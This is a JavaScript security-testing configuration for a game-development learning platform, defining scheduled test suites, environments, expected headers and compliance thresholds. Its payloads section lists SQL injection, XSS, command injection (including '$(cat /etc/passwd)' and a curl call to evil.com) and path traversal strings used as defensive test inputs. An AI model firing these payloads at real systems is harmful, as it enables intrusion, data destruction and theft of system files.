/**
 * Security Testing Configuration for LazyGameDevs GameLearn Platform
 *
 * This configuration file defines automated security test suites that run
 * periodically or on-demand to ensure the platform's security posture.
 *
 * Usage:
 * - Development: npm run security:test
 * - Production: Automated via CI/CD pipeline
 * - Manual: Via /api/security/testing endpoint
 */

module.exports = {
  // Global test configuration
  global: {
    timeout: 30000, // 30 seconds default timeout
    retries: 2,
    parallel: false, // Run tests sequentially to avoid overloading
    reporting: {
      format: ['json', 'html'],
      outputDir: './security-reports',
      includeEvidence: true
    },
    notifications: {
      critical: {
        enabled: true,
        recipients: ['security@lazygamedevs.com', 'emergency@lazygamedevs.com'],
        webhook: process.env.SECURITY_WEBHOOK_URL
      },
      summary: {
        enabled: true,
        recipients: ['dev-team@lazygamedevs.com'],
        schedule: 'daily'
      }
    }
  },

  // Test environment configurations
  environments: {
    development: {
      baseUrl: 'http://localhost:3000',
      apiKey: process.env.SECURITY_TEST_API_KEY_DEV,
      skipDestructiveTests: true,
      logLevel: 'debug'
    },
    staging: {
      baseUrl: process.env.STAGING_URL || 'https://staging.gamelearn.lazygamedevs.com',
      apiKey: process.env.SECURITY_TEST_API_KEY_STAGING,
      skipDestructiveTests: false,
      logLevel: 'info'
    },
    production: {
      baseUrl: process.env.PRODUCTION_URL || 'https://gamelearn.lazygamedevs.com',
      apiKey: process.env.SECURITY_TEST_API_KEY_PROD,
      skipDestructiveTests: true, // Never run destructive tests in production
      logLevel: 'warn',
      readOnly: true // Only run read-only security checks
    }
  },

  // Test suites configuration
  testSuites: {
    // Critical security tests - run daily
    critical: {
      name: 'Critical Security Checks',
      description: 'Essential security tests that must pass for production deployment',
      schedule: '0 2 * * *', // 2 AM daily
      enabled: true,
      failFast: true, // Stop on first critical failure
      tests: [
        {
          name: 'Authentication Security',
          category: 'auth_tests',
          tests: [
            'weak_passwords',
            'session_fixation',
            'jwt_vulnerabilities',
            'csrf_protection'
          ],
          severity: 'critical',
          endpoints: [
            '/api/auth/login',
            '/api/auth/register',
            '/api/auth/reset-password'
          ]
        },
        {
          name: 'Input Validation',
          category: 'input_validation',
          tests: [
            'sql_injection',
            'xss_payload',
            'command_injection'
          ],
          severity: 'high',
          endpoints: [
            '/api/courses',
            '/api/search',
            '/api/uploads',
            '/api/progress'
          ]
        },
        {
          name: 'Security Headers',
          category: 'config_tests',
          tests: [
            'security_headers',
            'tls_configuration',
            'cors_policy',
            'csp_policy'
          ],
          severity: 'high',
          endpoints: [
            '/',
            '/api/health',
            '/dashboard',
            '/courses'
          ]
        }
      ]
    },

    // Comprehensive security tests - run weekly
    comprehensive: {
      name: 'Comprehensive Security Assessment',
      description: 'Thorough security testing across all platform components',
      schedule: '0 1 * * 0', // 1 AM every Sunday
      enabled: true,
      failFast: false,
      tests: [
        {
          name: 'Business Logic Security',
          category: 'business_logic',
          tests: [
            'payment_bypass',
            'access_control',
            'workflow_manipulation',
            'resource_abuse'
          ],
          severity: 'high',
          endpoints: [
            '/api/payment',
            '/api/enrollment',
            '/api/courses/create',
            '/api/portfolio'
          ]
        },
        {
          name: 'API Security',
          category: 'config_tests',
          tests: [
            'rate_limiting',
            'error_handling',
            'cors_policy'
          ],
          severity: 'medium',
          endpoints: [
            '/api/auth/*',
            '/api/courses/*',
            '/api/uploads/*',
            '/api/monitoring/*'
          ]
        },
        {
          name: 'File Upload Security',
          category: 'input_validation',
          tests: [
            'malicious_file_upload',
            'file_type_validation',
            'file_size_limits',
            'path_traversal'
          ],
          severity: 'high',
          endpoints: [
            '/api/uploads',
            '/api/courses/content',
            '/api/portfolio/assets'
          ]
        }
      ]
    },

    // Game development specific tests
    gamedev_specific: {
      name: 'Game Development Platform Security',
      description: 'Security tests specific to game development features',
      schedule: '0 3 * * 3', // 3 AM every Wednesday
      enabled: true,
      tests: [
        {
          name: 'Asset Security',
          category: 'business_logic',
          tests: [
            'asset_access_control',
            'game_build_integrity',
            'code_injection_in_assets'
          ],
          severity: 'high',
          endpoints: [
            '/api/assets',
            '/api/builds',
            '/api/portfolio/games'
          ]
        },
        {
          name: 'Collaboration Security',
          category: 'business_logic',
          tests: [
            'collaboration_access_control',
            'real_time_security',
            'project_isolation'
          ],
          severity: 'medium',
          endpoints: [
            '/api/collaboration',
            '/api/projects/share',
            '/api/websocket'
          ]
        },
        {
          name: 'Course Piracy Protection',
          category: 'business_logic',
          tests: [
            'video_protection',
            'content_download_prevention',
            'sharing_detection'
          ],
          severity: 'high',
          endpoints: [
            '/api/courses/video',
            '/api/courses/download',
            '/api/courses/access'
          ]
        }
      ]
    },

    // Infrastructure security tests
    infrastructure: {
      name: 'Infrastructure Security',
      description: 'Security tests for underlying infrastructure and services',
      schedule: '0 4 * * 6', // 4 AM every Saturday
      enabled: true,
      tests: [
        {
          name: 'Network Security',
          category: 'infrastructure',
          tests: [
            'port_scanning',
            'service_enumeration',
            'ssl_vulnerabilities'
          ],
          severity: 'medium',
          targets: [
            'gamelearn.lazygamedevs.com',
            'api.lazygamedevs.com',
            'cdn.lazygamedevs.com'
          ]
        },
        {
          name: 'Database Security',
          category: 'infrastructure',
          tests: [
            'database_access_control',
            'connection_security',
            'backup_security'
          ],
          severity: 'high',
          endpoints: [
            '/api/health/database',
            '/api/monitoring/database'
          ]
        },
        {
          name: 'Monitoring Security',
          category: 'infrastructure',
          tests: [
            'monitoring_access_control',
            'log_security',
            'metrics_exposure'
          ],
          severity: 'medium',
          endpoints: [
            '/api/monitoring',
            '/api/health',
            '/api/logs'
          ]
        }
      ]
    }
  },

  // Test payloads and configurations
  payloads: {
    sqlInjection: [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "' UNION SELECT NULL, version() --",
      "1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
      "admin'--",
      "admin' /*",
      "' OR 1=1#",
      "' OR 'a'='a",
      "') OR ('1'='1"
    ],
    xssPayloads: [
      "<script>alert('XSS')</script>",
      "\"><script>alert('XSS')</script>",
      "';alert('XSS');//",
      "<img src=x onerror=alert('XSS')>",
      "javascript:alert('XSS')",
      "<svg onload=alert('XSS')>",
      "<iframe src=javascript:alert('XSS')></iframe>",
      "<body onload=alert('XSS')>",
      "<input onfocus=alert('XSS') autofocus>"
    ],
    commandInjection: [
      "; ls -la",
      "| whoami",
      "`id`",
      "$(cat /etc/passwd)",
      "; cat /etc/hosts",
      "& dir",
      "; ping -c 1 127.0.0.1",
      "| curl http://evil.com"
    ],
    pathTraversal: [
      "../../../etc/passwd",
      "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
      "/var/log/apache/access.log",
      "....//....//....//etc/passwd",
      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
      "..%252f..%252f..%252fetc%252fpasswd"
    ]
  },

  // Security headers expected
  securityHeaders: {
    required: [
      'x-content-type-options',
      'x-frame-options',
      'x-xss-protection',
      'strict-transport-security',
      'content-security-policy',
      'referrer-policy'
    ],
    values: {
      'x-content-type-options': 'nosniff',
      'x-frame-options': 'DENY',
      'x-xss-protection': '1; mode=block',
      'strict-transport-security': /max-age=\d+/,
      'referrer-policy': 'strict-origin-when-cross-origin'
    }
  },

  // Compliance and reporting
  compliance: {
    standards: ['OWASP Top 10', 'CWE Top 25', 'GDPR', 'SOC 2'],
    reporting: {
      formats: ['json', 'xml', 'pdf', 'html'],
      includeRemediation: true,
      includeCVSS: true,
      includeEvidence: true
    },
    thresholds: {
      critical: 0, // No critical vulnerabilities allowed
      high: 5,    // Maximum 5 high severity issues
      medium: 20, // Maximum 20 medium severity issues
      low: 50     // Maximum 50 low severity issues
    }
  },

  // Integration settings
  integrations: {
    ci_cd: {
      enabled: true,
      failBuild: {
        onCritical: true,
        onHighCount: 10
      },
      reports: {
        junit: true,
        sonarqube: true,
        slack: true
      }
    },
    siem: {
      enabled: process.env.NODE_ENV === 'production',
      endpoint: process.env.SIEM_ENDPOINT,
      apiKey: process.env.SIEM_API_KEY,
      formats: ['cef', 'json']
    },
    ticketing: {
      enabled: true,
      system: 'github', // or 'jira', 'servicenow'
      autoCreate: {
        critical: true,
        high: false
      },
      labels: ['security', 'automated-test']
    }
  },

  // Custom test definitions
  customTests: {
    lazyGameDevsSpecific: {
      courseAccessControl: {
        description: 'Verify course access control mechanisms',
        endpoints: ['/api/courses/{id}', '/api/courses/{id}/content'],
        tests: [
          'unauthorized_course_access',
          'privilege_escalation_instructor',
          'course_content_bypass'
        ]
      },
      portfolioSecurity: {
        description: 'Test portfolio and project security',
        endpoints: ['/api/portfolio', '/api/projects'],
        tests: [
          'portfolio_access_control',
          'project_isolation',
          'game_build_security'
        ]
      },
      paymentSecurity: {
        description: 'Verify payment and enrollment security',
        endpoints: ['/api/payment', '/api/enrollment'],
        tests: [
          'payment_bypass',
          'price_manipulation',
          'free_course_access'
        ]
      }
    }
  }
}